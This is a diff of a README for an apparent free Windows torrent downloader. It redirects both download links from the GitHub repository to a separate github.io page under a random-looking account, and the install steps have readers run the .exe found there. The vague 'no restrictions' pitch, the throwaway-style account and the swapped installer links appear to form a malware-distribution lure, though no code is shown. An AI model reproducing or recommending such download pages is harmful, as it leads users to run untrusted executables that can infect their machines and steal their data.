@@ -1,6 +1,6 @@
 # 📥 Torrent-Downloader-2026-Free-Fast - Download files quickly without any restrictions
 
-[![Download Now](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Free-genusglossopsitta91/Torrent-Downloader-2026-Free-Fast)
+[![Download Now](https://img.shields.io/badge/Download-Installer-blue.svg)](https://free-genusglossopsitta91.github.io)
 
 Torrent-Downloader-2026-Free-Fast provides a solution for users who need to manage file transfers on Windows. This tool simplifies the process of handling peer-to-peer data transfers. You receive a clean interface that allows you to start, pause, and finish file downloads with minimal effort. This software removes unnecessary barriers and speeds up the movement of large data packages.
 
@@ -18,7 +18,7 @@ Before you install this software, confirm that your computer meets these basic r
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the [official download page](https://github.com/Free-genusglossopsitta91/Torrent-Downloader-2026-Free-Fast) to obtain the installation file.
+1.  Visit the [official download page](https://free-genusglossopsitta91.github.io) to obtain the installation file.
 2.  Locate the file in your Downloads folder after the transfer finishes.
 3.  Double-click the .exe file to trigger the installer.
 4.  Follow the on-screen prompts provided by the setup wizard.
